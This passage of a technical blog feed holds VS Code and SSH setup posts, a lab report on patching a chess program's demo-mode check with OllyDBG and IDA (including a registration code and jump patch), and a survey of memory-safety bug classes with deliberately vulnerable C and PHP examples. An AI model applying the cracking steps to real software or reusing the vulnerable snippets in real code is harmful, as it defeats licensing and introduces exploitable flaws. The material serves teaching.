<p>之后在 vscode 插件管理器当中安装 <code>C/C++ GNU Global</code>，运行 <code>ctrl+P</code> 加 <code>&gt;</code> 来看 global 的配置。如果不出错的话，就可以自动进行函数跳转和 code reference 了。</p>
<h2 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h2><p>由于系统默认的文件个数为 <code>8192</code>，因此像 Linux Kernel 这个级数的项目，需要手动对 Ubuntu 的文件打开数进行设置，<span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vZG9jcy9zZXR1cC9saW51eCNfdmlzdWFsLXN0dWRpby1jb2RlLWlzLXVuYWJsZS10by13YXRjaC1mb3ItZmlsZS1jaGFuZ2VzLWluLXRoaXMtbGFyZ2Utd29ya3NwYWNlLWVycm9yLWVub3NwYw==" title="https://code.visualstudio.com/docs/setup/linux#_visual-studio-code-is-unable-to-watch-for-file-changes-in-this-large-workspace-error-enospc">参考 vscode 官网<i class="fa fa-external-link"></i></span>。</p>
<p>When you see this notification, it indicates that the VS Code file watcher is running out of handles because the workspace is large and contains many files. The current limit can be viewed by running:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;sys&#x2F;fs&#x2F;inotify&#x2F;max_user_watches</span><br></pre></td></tr></table></figure>

<p>The limit can be increased to its maximum by editing <code>/etc/sysctl.conf</code> and adding this line to the end of the file:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fs.inotify.max_user_watches&#x3D;524288</span><br></pre></td></tr></table></figure>

<p>The new value can then be loaded in by running <code>sudo sysctl -p</code>. Note that <span class="exturl" data-url="aHR0cHM6Ly93d3cuYXJjaGxpbnV4Lm9yZy8=" title="https://www.archlinux.org/">Arch Linux<i class="fa fa-external-link"></i></span> works a little differently, See <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2d1YXJkL2xpc3Rlbi93aWtpL0luY3JlYXNpbmctdGhlLWFtb3VudC1vZi1pbm90aWZ5LXdhdGNoZXJz" title="https://github.com/guard/listen/wiki/Increasing-the-amount-of-inotify-watchers">Increasing the amount of inotify watchers<i class="fa fa-external-link"></i></span> for details.</p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Linux Kernel</tag>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title>vscode remote-ssh setup</title>
    <url>/2020/03/19/vscode-remote-ssh-setup/</url>
    <content><![CDATA[<p>这段时间新型冠状病毒肆虐，我也被影响只能在家办公。学校为学生提供了服务器，为了能供用 vscode 访问我在服务器上的 Linux Kernel 目录，我开始搜索配置方法。</p>
<p>本文主要介绍了如何使用 vscode 配置 remote-ssh 来连接远程服务器。包括了跳板机的引入方法。</p>
<a id="more"></a>

<h2 id="安装-OpenSSH"><a href="#安装-OpenSSH" class="headerlink" title="安装 OpenSSH"></a>安装 OpenSSH</h2><p>似乎是因为 vscode 默认的 ssh 工具有问题，所以需要在 windows 上面安装 <code>OpenSSH</code>。当然安装的步骤也很简单，<strong>管理员</strong>打开 windows Powershell，我选择的是新版的 windows terminal，建议大家可以去搜索一下，颜值很高。注意要以管理员权限操作，否则会提示权限不够。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\lufei&gt; <span class="built_in">Get-WindowsCapability</span> <span class="literal">-Online</span> | ? Name <span class="operator">-like</span> <span class="string">'OpenSSH*'</span></span><br><span class="line"></span><br><span class="line">Name  : OpenSSH.Client~~~~<span class="number">0.0</span>.<span class="number">1.0</span></span><br><span class="line">State : Installed</span><br><span class="line"></span><br><span class="line">Name  : OpenSSH.Server~~~~<span class="number">0.0</span>.<span class="number">1.0</span></span><br><span class="line">State : NotPresent</span><br></pre></td></tr></table></figure>

<p>可以看到我的电脑上已经安装了 <code>OpenSSH.Client</code>，如果没有安装，那么在第一个 <code>State</code> 的 Value 处应该是 <code>NotPresent</code>。</p>
<p>运行以下指令即可安装</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PS C:\Users\lufei&gt; <span class="built_in">Add-WindowsCapability</span> <span class="literal">-Online</span> <span class="literal">-Name</span> OpenSSH.Client~~~~<span class="number">0.0</span>.<span class="number">1.0</span></span><br></pre></td></tr></table></figure>

<p>安装完成会返回下列信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Path          :</span><br><span class="line">Online        : True</span><br><span class="line">RestartNeeded : False</span><br></pre></td></tr></table></figure>



<h2 id="配置-SSH-config"><a href="#配置-SSH-config" class="headerlink" title="配置 SSH config"></a>配置 SSH config</h2><p>点击 vscode 左侧的 <code>Remote Explorer</code>，选择 <code>SSH Targets</code>，然后选择 <code>config</code>（设置形状的小图标），在跳出的输入框下选择 <code>C:\Users\lufei\.ssh\config</code>，进入编辑页面。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Host JumpMachine</span><br><span class="line">    # 跳板机的ip地址</span><br><span class="line">    HostName A</span><br><span class="line">    # 你跳板机的用户名</span><br><span class="line">    User username</span><br><span class="line">    # 跳板机登录端口 </span><br><span class="line">    Port 22</span><br><span class="line"></span><br><span class="line">Host lab_server</span><br><span class="line">    # 目标机的ip地址</span><br><span class="line">    HostName B</span><br><span class="line">    # 你目标机的用户名</span><br><span class="line">    User username</span><br><span class="line">    # 目标机登录端口 </span><br><span class="line">    Port 8080</span><br><span class="line">    ProxyCommand "openssh的安装路径"\ssh.exe -W %h:%p JumpMachine</span><br></pre></td></tr></table></figure>

<p> 其中“openssh的安装路径”要参考用户自己的设置，我的 openssh 的安装路径为<code>C:\Windows\System32\OpenSSH\ssh.exe</code>。 </p>
<p>保存文件，然后再左侧的 <code>SSH TARGETS</code> 列表中选择自己的 <code>lab_server</code>，点击右侧的小按钮，就可以连接了。</p>
<h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><ol>
<li>有时候会在远程连接的时候出现 <code>syntax error near unexpected token &#39;then&#39;</code> 的错误，导致无法远程连接主机，参考 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pY3Jvc29mdC92c2NvZGUtcmVtb3RlLXJlbGVhc2UvaXNzdWVzLzI1MjgjaXNzdWVjb21tZW50LTU5OTMzNTAwMg==" title="https://github.com/microsoft/vscode-remote-release/issues/2528#issuecomment-599335002">Github Issue<i class="fa fa-external-link"></i></span>，在 <code>Remote-SSH</code> 插件的设置项当中把 <code>Use Local Server</code> 这一选项关掉即可。</li>
</ol>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>vscode</tag>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>win32 Soft Exploit</title>
    <url>/2020/03/09/win32-Soft-Exploit/</url>
    <content><![CDATA[<p>本文为一软件逆向实验的报告，关于该实验的信息出于老师的保密原则，在此处不会列出，文中介绍的均为我自己掌握的一些技巧，在网上也都可以搜到。逆向主要用到了 <span class="exturl" data-url="aHR0cDovL3d3dy5vbGx5ZGJnLmRlLw==" title="http://www.ollydbg.de/">OllyDBG<i class="fa fa-external-link"></i></span> 和 <span class="exturl" data-url="aHR0cHM6Ly93d3cuaGV4LXJheXMuY29tL3Byb2R1Y3RzL2lkYS8=" title="https://www.hex-rays.com/products/ida/">IDA Pro<i class="fa fa-external-link"></i></span> 这两个软件，同时汇编语言为 x86 汇编，和 Linux 上的 AT&amp;T 汇编格式稍有不同，主要的区别是<strong>赋值对象在左</strong>。</p>
<a id="more"></a>

<h2 id="软件初览"><a href="#软件初览" class="headerlink" title="软件初览"></a>软件初览</h2><p>本次要进行逆向的软件为一款不知名的下棋软件，界面如下图所示。</p>
<p><img src="/images/win32-soft-exploit/soft-interface.png" alt=""></p>
<p>古朴的 XP 风格下，藏着一颗善良的为大众提供免费软件的心。然而这是危险的陷阱，对于所有认真制作软件的程序员来说，你的支持才是他们继续创造的动力。大家都是要恰饭的。</p>
<p>上图展示的是第一次运行该软件时，所展现的界面。目之所及有两块显示面板，对，显示面板，这是我自己的叫法，在 windows 里面应该叫做视窗。两块显示面板分别为选择用户窗口和游戏主界面窗口。目前，并没有任何需要我们输入注册码或者进行付费的需要。</p>
<p>当然我们也可以注意到，这里有一个 add new player 的选项，皮一点的同学们肯定会自己创建一个新得用户名，当然我也是，而且创建新得用户名有个好处，那就是会<u>在某处加入我们自己的信息</u>，而这个<strong>某处</strong>，很可能就存放着重要的信息。</p>
<p>我输入了自己的名字 <strong>tianyu</strong>，点击 Add 进入了游戏。</p>
<p>本次实验关注的是软件的注册破解，即可以永久的免费的使用该软件。当然，这仅仅是为了实验的目的，而不是免费使用付费软件的借口。我相信能够看懂汇编且认真读完我写的这篇文章的朋友，肯定不是白嫖的人。</p>
<p>一个软件的注册信息通常放在工具栏的最后一处，常常以 About 或者 Information 等词语来命名，同样在这款软件里面，也有类似的选项。</p>
<p>点击 About 按钮，发现一共有 3 个选项，如下图所示，如果我们选择 About 选项点进去，就会发现该软件的注册信息为 Unregistered Version，即并没有注册。注意此时 Register 按钮是黑色的，即我们可以点击该按钮进行注册。</p>
<p><img src="/images/win32-soft-exploit/about-1.png" alt=""></p>
<p>然而选择 Register 按钮点击之后，会跳出一个弹窗，显示 Operation do not allowed in this demo，然后只能选择确定，之后软件会自动打开一个网页，在该网页上可以选择付费和下载正式版。</p>
<p>因此我们碰到了两个问题：</p>
<ol>
<li>无法获得输入注册码的入口</li>
<li>无法得知正确的验证码是什么</li>
</ol>
<p>那么如何解决这几个问题呢？在给出回答之前，不妨回顾一下我们打开这款软件并查看注册信息的一系列流程。看看在这些流程中间，是否存在着可乘之机，让我们能够了解到该软件的注册原理。</p>
<h2 id="简单的思考"><a href="#简单的思考" class="headerlink" title="简单的思考"></a>简单的思考</h2><p>如果有类似使用付费软件的经历，那么我想你肯定能够明白，早期的软件基本采用的是注册名加注册码的方式对付费软件注册，比如知名的 Adobe 全家桶还有 Windows 操作系统。当然现今大部分软件的注册码都是联网验证的，因此获取有效注册码并不是一个很好的思路，因为往往这些验证码都是随机出来的值。</p>
<p>老师告诉我们，这款软件的注册码是基于一个算法得到的，而这个算法就写在了这个软件的二进制代码当中，因此获取到生成注册码的代码，了解注册码校验的流程应该是本次软件破解的重点。</p>
<p>那么基于这个思路，就可以去思考一下，该怎么去破解这个软件了。我们需要掌握的信息大概有以下几点：</p>
<ol>
<li>注册码存放的位置</li>
<li>注册码生成的算法</li>
<li>是否存在除注册码外的用于验证软件是否注册的信息</li>
</ol>
<p>主要的就以上三点，基于注册码等注册信息的破解，就可以展开了。</p>
<p>那么这个时候就轮到之前介绍过的软件，OllyDBG 登场了。这个软件是类似于强化版本的 gdb，可以动态调试 win32 上的可执行文件。软件界面分为 4 个窗格，分别显示了可执行文件的二进制代码段及其汇编表示、寄存器信息、内存地址及内容和函数调用堆栈信息。</p>
<p>这四个窗格都很重要，后续也会进一步截图来说明。</p>
<h2 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h2><p>未完待续。</p>
<h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><p>用 OllyDBG + IDA Pro 对 <code>xxx</code> 进行分析，寻找<strong>弹出注册对话框</strong>的代码；修改 exe，使得在点击 about -&gt; register 菜单的时候能弹出注册对话框而非原本的 “Operation do not allowed in this demo”。</p>
<h3 id="推理过程"><a href="#推理过程" class="headerlink" title="推理过程"></a>推理过程</h3><p>在第一节课的实验中，已经成功的找到注册码存放位置和注册码生成算法，因此可以通过修改注册表的方式来使得软件注册成功。</p>
<p>由于这次需要通过注册码来注册，因此我记下了用户名和对应的注册码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户名 tianyu</span><br><span class="line">注册码 CH&amp;0HuCq90HuCq90Huof1y1111</span><br></pre></td></tr></table></figure>

<p><strong>结合第一次实验时定位 MessageBoxA 的方法，我联想到了需要寻找的注册对话框代码一定也存在类似的调用方式。即会存在着类似以下形式的调用代码。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push 0x30  # Style &#x3D; MB_OK|MB_ICONEXCLAMATION|MB_APPLMODAL</span><br><span class="line">push 00438850  # Title &#x3D; &quot;Demo Version&quot;</span><br><span class="line">push 00438860  # Text &#x3D; &quot;Operation do not allowed in this ...&quot;</span><br><span class="line">mov  eax, [ebp+0x8]</span><br><span class="line">push eax</span><br><span class="line">call [&lt;&amp;USER32.MessageBoxA&gt;]  # MessageBoxA</span><br></pre></td></tr></table></figure>

<p>上述代码是点击 register 按钮之后弹出的 MessageBox 的调用代码，由于我们希望找到的弹出注册对话框也属于弹窗，那么势必<strong>存在着调用代码</strong>，且这个弹窗属于可以<strong>输入内容的弹窗</strong>（并不是 Message Box），最后肯定会有 Text 段或者 Title 段和 “register” 有关。</p>
<p><strong>因此我们需要做的是</strong></p>
<ol>
<li>结合上述调用的上下文，搜索 win32 弹窗的名字（包含对话框的）</li>
<li>在代码中搜索对话框函数的关键字，找到所有调用点</li>
<li>根据 Title 和 Text 段初步筛查，找到可疑的调用</li>
<li>直接使用 “此处为新 eip” 进行测试</li>
<li>修改代码使得原本弹出的 Message Box 改为我们希望的对话框</li>
</ol>
<h3 id="跟踪步骤"><a href="#跟踪步骤" class="headerlink" title="跟踪步骤"></a>跟踪步骤</h3><h4 id="找到原本点击-register-按钮会弹出对话框的函数调用点-（在-OD-中）"><a href="#找到原本点击-register-按钮会弹出对话框的函数调用点-（在-OD-中）" class="headerlink" title="找到原本点击 register 按钮会弹出对话框的函数调用点 （在 OD 中）"></a>找到原本点击 register 按钮会弹出对话框的函数调用点 （在 OD 中）</h4><ol>
<li>搜索 <code>MessageBoxA</code>，在函数首地址设下断点</li>
<li>运行程序，并手动操作点击 register 按钮</li>
<li>程序会停在函数的第一句指令处，使用 <code>ctrl+F9</code> 回到函数返回处，从而找到了 MessageBoxA 的调用点，即我们后续需要修改的代码位置 <code>0x00410594</code></li>
</ol>
<p><img src="/images/win32-soft-exploit/p1.png" alt=""></p>
<h4 id="搜索-win32-可输入文字对话框的名字"><a href="#搜索-win32-可输入文字对话框的名字" class="headerlink" title="搜索 win32 可输入文字对话框的名字"></a>搜索 win32 可输入文字对话框的名字</h4><ol>
<li>搜索上一步中找到的代码的上下文，可以找到有个可疑的函数名 <code>DialogBoxParamA</code></li>
<li>在网上搜索关于 win32 的对话框函数名，找到了 <code>DialogBoxParamA</code> 函数的<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy93aW4zMi9hcGkvd2ludXNlci9uZi13aW51c2VyLWRpYWxvZ2JveHBhcmFtYQ==" title="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-dialogboxparama">官方文档<i class="fa fa-external-link"></i></span></li>
<li>根据官方文档我们得知，<code>DialogBoxParamA</code> 很有可能就是我们需要找的对话框的函数名称</li>
<li>因此在 OD 中的代码窗，找到刚刚看到的 DialogBoxParamA 函数的调用点（当然也可以使用第一步的方法，在函数首地址设断点来找），得到了函数调用语句的指令</li>
</ol>
<p><img src="/images/win32-soft-exploit/p2.png" alt=""></p>
<ol start="5">
<li>在代码窗点击右键-&gt;查找-&gt;所有命令，输入 <code>call [004728e0]</code>，注意这里是小端存储，所以字节要 reverse 一下，当然也可以参考代码提示窗的显示</li>
<li>得到了如下图的视窗，这个视窗当中显示了所有调用 <code>DialogBoxParamA</code> 函数的位置，双击里面的条目就可以在代码窗当中看到相应的调用代码</li>
</ol>
<p><img src="/images/win32-soft-exploit/p3.png" alt="1583765409025"></p>
<ol start="7">
<li>逐个筛查的过程中，发现了如图可疑的调用点</li>
</ol>
<p><img src="/images/win32-soft-exploit/p4.png" alt="1583765639986"></p>
<p>这里的模板称为 &quot;DLG_LICENCA&quot;，因此我推断很有可能和注册码有关。</p>
<ol start="8">
<li>我们点击上图中地址为 004105DD 的地方，使用此处为新 EIP 来使得运行这段调用代码</li>
<li>点击 Run 按钮，结果发现在 <code>xxx</code> 程序中弹出了<strong>“软件注册对话框”</strong></li>
</ol>
<p><img src="/images/win32-soft-exploit/p5.png" alt="1583765903487"></p>
<h3 id="修改步骤"><a href="#修改步骤" class="headerlink" title="修改步骤"></a>修改步骤</h3><ol>
<li>上一步我们得到了调用该对话框的地址，因此可以将这段调用代码原原本本的复制到之前我们记下的需要修改的代码位置 <code>0x00410594</code></li>
</ol>
<p><img src="/images/win32-soft-exploit/p6.png" alt="1583766062214"></p>
<ol start="2">
<li>回到需要修改的代码位置 <code>0x00410594</code>，将代码修改为和调用注册对话框一致</li>
</ol>
<p><img src="/images/win32-soft-exploit/p7.png" alt="1583766402175"></p>
<p>当然，也可以使用聪明的做法，直接将第一句指令（起始地址为<code>[0x00410594]</code>）改为 <code>jmp 004105DD</code>，这里的 <code>0x004105DD</code> 就是我们之前分析的调用弹出注册对话框的代码起始地址</p>
<p><img src="/images/win32-soft-exploit/p8.png" alt="1583766642884"></p>
<p>两种方法的结果都是可以成功弹出注册对话框</p>
<ol start="3">
<li>点击About -&gt; register 按钮，查看是否能够点击按钮弹出</li>
</ol>
<p><img src="/images/win32-soft-exploit/p9.png" alt="1583767217728"></p>
<ol start="4">
<li>接下来需要保存我们的更改，点击代码，右键复制到可执行文件</li>
</ol>
<p><img src="/images/win32-soft-exploit/p10.png" alt="1583768869941"></p>
<ol start="5">
<li>在弹出的代码窗中点击关闭按钮，会出现一个弹窗，选择“是”，保存到指定路径，<strong>注意这里的路径必须和原来 <code>xxx</code></strong>的安装路径相同，即和原来的 <code>xxx.exe</code> 位于同一路径下，否则会产生相关依赖无法找到，程序运行异常**</li>
</ol>
<p><img src="/images/win32-soft-exploit/p11.png" alt="1583769052675"></p>
<ol start="6">
<li>打开刚刚保存的 .exe 文件，点击 About -&gt; register 按钮会弹出注册对话框</li>
</ol>
<p><img src="/images/win32-soft-exploit/p12.png" alt="1583769858784"></p>
<p><strong>验证完成！</strong></p>
]]></content>
      <categories>
        <category>Language</category>
        <category>Assembly</category>
      </categories>
      <tags>
        <tag>win32</tag>
        <tag>exploit</tag>
      </tags>
  </entry>
  <entry>
    <title>Common Bugs of Computer Systems</title>
    <url>/2020/02/28/Bug-Classes/</url>
    <content><![CDATA[<p>This article shows the main bugs of Computer Systems, including stack overflow, integer overflow, heap overflow and so on. Also I refer the the seed lab to collect some attack methods.</p>
<a id="more"></a>

<h2 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h2><ul>
<li>stack buffer overflow</li>
<li>kernel stack overflow</li>
</ul>
<p>Often results in return address changed and executes an adversary code.</p>
<h3 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h3><ul>
<li>stack canaries<ul>
<li>gcc <code>-fstack-protector</code></li>
<li><code>-fstack-protector-strong</code></li>
</ul>
</li>
<li>alloca checking<ul>
<li>PAX_MEMORY_STACKLEADK</li>
</ul>
</li>
<li>address space randomization<ul>
<li>process stack address</li>
<li>kernel stack location</li>
</ul>
</li>
<li>shadow stacks</li>
</ul>
<h2 id="Integer-Over-Under-flow"><a href="#Integer-Over-Under-flow" class="headerlink" title="Integer Over/Under flow"></a>Integer Over/Under flow</h2><p>The kernel will refer to some variable with the integer type, and if you find some way to trigger this value to increase(in user space), then the integer overflow will happen. Sometimes this integer becomes zero will cause the kernel to delete an object and free the memory, leads to a series of attacks.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9wZXJjZXB0aW9uLXBvaW50LmlvL3Jlc291cmNlcy9yZXNlYXJjaC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHkv" title="https://perception-point.io/resources/research/analysis-and-exploitation-of-a-linux-kernel-vulnerability/">CVE-2016-0728<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9kdWFzeW50LmNvbS9wYWdlP249MDIwMTIwMTY=" title="https://duasynt.com/page?n=02012016">CVE-2014-2851<i class="fa fa-external-link"></i></span></li>
</ul>
<h3 id="Mitigations-1"><a href="#Mitigations-1" class="headerlink" title="Mitigations"></a>Mitigations</h3><ul>
<li>check for refcount overflow (eg. PAX_REFCOUNT)<ul>
<li>PAX_REFCOUNT port: David Windsor, Elena Reshetova</li>
</ul>
</li>
<li>compiler plugin to detect multiplication overflows at runtime (e.g. PAX_SIZE_OVERFLOW)</li>
</ul>
<h2 id="Heap-Overflow"><a href="#Heap-Overflow" class="headerlink" title="Heap Overflow"></a>Heap Overflow</h2><p>A heap overflow condition is a buffer overflow, where the buffer that can be overwritten is allocated in the heap portion of memory, generally meaning that the buffer was allocated using a routine such as <code>malloc()</code>.</p>
<ul>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9zYW1zY2xhc3MuaW5mby8xMjcvcHJvai9wNy1oZWFwMC5odG0=" title="https://samsclass.info/127/proj/p7-heap0.htm">Very Simple Heap Overflow<i class="fa fa-external-link"></i></span></p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmluY2x1ZGVzZWN1cml0eS5jb20vMjAxNC8wNi9leHBsb2l0LXdhbGt0aHJvdWdoLWN2ZS0yMDE0LTAxOTYtcHR5LWtlcm5lbC1yYWNlLWNvbmRpdGlvbi5odG1s" title="https://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html">Exploiting CVE-2014-0196 a walk-through of the Linux pty race condition PoC<i class="fa fa-external-link"></i></span></p>
</li>
</ul>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE 256</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    buf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*BUFSIZE);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The buffer is allocated heap memory with a fixed size, but there is no guarantee the string in argv[1] will not exceed this size and cause an overflow.</p>
<h3 id="Mitigations-2"><a href="#Mitigations-2" class="headerlink" title="Mitigations"></a>Mitigations</h3><ul>
<li>runtime validation of variable size vs copy_to_user / copy_from_user size (e.g. PAX_USERCOPY)<ul>
<li>CONFIG_HARDENED_USERCOPY</li>
</ul>
</li>
<li>guard pages</li>
<li>metadata validation (e.g. glibc&#39;s heap protections) <ul>
<li>CONFIG_DEBUG_LIST hardening</li>
</ul>
</li>
</ul>
<h2 id="Format-String-Injection"><a href="#Format-String-Injection" class="headerlink" title="Format String Injection"></a>Format String Injection</h2><p>The software uses a function that accepts a format string as an argument, but the format string originates from an external source.</p>
<p>When an attacker can modify an externally-controlled format string, this can lead to buffer overflows, denial of service, or data representation problems.</p>
<p>It should be noted that in some circumstances, such as internationalization, the set of format strings is externally controlled by design. If the source of these format strings is trusted (e.g. only contained in library files that are only modifiable by the system administrator), then the external control might not itself pose a vulnerability.</p>
<h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printWrapper</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">string</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="built_in">string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">5012</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, argv[<span class="number">1</span>], <span class="number">5012</span>); <span class="comment">// copy such as '\0'</span></span><br><span class="line">    printWrapper(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The example is exploitable, because of the call to <code>printf()</code> in the <code>printWrapper()</code> function. </p>
<p><strong>Note:</strong> The stack buffer was added to make exploitation more simple.</p>
<h3 id="Mitigations-3"><a href="#Mitigations-3" class="headerlink" title="Mitigations"></a>Mitigations</h3><ul>
<li>Drop %n entirely (v3.13)</li>
<li>detect non-const format strings at compile time (e.g. gcc&#39;s -Wformat-security, or better plugin)</li>
<li>detect non-const format strings at run time (e.g. memory location checking done with glibc&#39;s -D_FORITY_SOURCE=2)</li>
</ul>
<h2 id="Kernel-Pointer-Leak"><a href="#Kernel-Pointer-Leak" class="headerlink" title="Kernel Pointer Leak"></a>Kernel Pointer Leak</h2><p>When a kernel memory address (any of text, stack, heap, etc) leaks into userspace, attackers can learn potentially sensitive information about data layout, kernel layout, stack layout, architecture layout, etc. </p>
<p>These can be used in turn to perform attacks where those sensitive locations are needed for a successful exploitation. If locations aren&#39;t identified correctly, an attacker could crash the entire system, which makes kernel leaks critical to successful exploitation.</p>
<ul>
<li>so many: /proc (kallsyms, modules, slabinfo, etc), /sys, etc</li>
<li><span class="exturl" data-url="aHR0cDovL3Z1bG5mYWN0b3J5Lm9yZy9leHBsb2l0cy9hbHBoYS1vbWVnYS5j" title="http://vulnfactory.org/exploits/alpha-omega.c">alpha-omega.c<i class="fa fa-external-link"></i></span> uses INET_DIAG to target socket structure function pointers on the heap</li>
</ul>
<h3 id="Mitigations-4"><a href="#Mitigations-4" class="headerlink" title="Mitigations"></a>Mitigations</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXQua2VybmVsLm9yZy9saW51cy80NTVjZDVhYjMwNWM5MGZmYzQyMmRkMmUwZmI2MzQ3MzA5NDJiMjU3" title="https://git.kernel.org/linus/455cd5ab305c90ffc422dd2e0fb634730942b257">kptr_restrict<i class="fa fa-external-link"></i></span> is too weak: requires opt-in by developers</li>
<li>remove visibility to kernel symbols (e.g. GRKERNSEC_HIDESYM)</li>
<li>detect and block usage of %p or similar writes to seq_file or other user buffers (e.g. GRKERNSEC_HIDESYM + PAX_USERCOPY)</li>
</ul>
<h2 id="Uninitialized-Variables"><a href="#Uninitialized-Variables" class="headerlink" title="Uninitialized Variables"></a>Uninitialized Variables</h2><p>In some languages such as C and C++, stack variables are not initialized by default. They generally contain junk data with the contents of stack memory before the function was invoked. An attacker can sometimes control or read these contents. In other languages or conditions, a variable that is not explicitly initialized can be given a default value that has security implications, depending on the logic of the program. The presence of an uninitialized variable can sometimes indicate a typographic error in the code.</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (authenticate($username,$password) &amp;&amp; setAdmin($username))&#123;</span><br><span class="line">    $isAdmin = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">/.../</span><br><span class="line"><span class="keyword">if</span> ($isAdmin)&#123;</span><br><span class="line">    deleteUser($userToDelete);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The <code>$isAdmin</code> variable is set to true if the user is an admin, but is uninitialized otherwise. If PHP&#39;s register_globals feature is enabled, an attacker can set uninitialized variables like <code>$isAdmin</code> to arbitrary values, in this case gaining administrator privileges by setting <code>$isAdmin</code> to true.</p>
<h3 id="Mitigations-5"><a href="#Mitigations-5" class="headerlink" title="Mitigations"></a>Mitigations</h3><ul>
<li>instrument compiler to fully initialize all structures (e.g. PAX_MEMORY_STACKLEAK)</li>
<li>clear kernel stack between system calls (e.g. PAX_MEMORY_STRUCTLEAK)</li>
</ul>
<h2 id="Use-after-free"><a href="#Use-after-free" class="headerlink" title="Use-after-free"></a>Use-after-free</h2><p>Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.</p>
<p>The use of previously-freed memory can have any number of adverse consequences, ranging from the corruption of valid data to the execution of arbitrary code, depending on the instantiation and timing of the flaw. The simplest way data corruption may occur involves the system&#39;s reuse of the freed memory. Use-after-free errors have two common and sometimes overlapping causes:</p>
<ul>
<li>Error conditions and other exceptional circumstances.</li>
<li>Confusion over which part of the program is responsible for freeing the memory.</li>
</ul>
<p>In this scenario, the memory in question is allocated to another pointer validly at some point after it has been freed. The original pointer to the freed memory is used again and points to somewhere within the new allocation. As the data is changed, it corrupts the validly used memory; this induces undefined behavior in the process.</p>
<p>If the newly allocated data chances to hold a class, in C++ for example, various function pointers may be scattered within the heap data. If one of these function pointers is overwritten with an address to valid shellcode, execution of arbitrary code can be achieved.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>* ptr = (<span class="keyword">char</span>*)<span class="built_in">malloc</span> (SIZE);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">    abrt = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (abrt) &#123;</span><br><span class="line">    logError(<span class="string">"operation aborted before commit"</span>, ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>When an error occurs, the pointer is immediately freed. However, this pointer is later incorrectly used in the <code>logError()</code> function.</p>
]]></content>
      <categories>
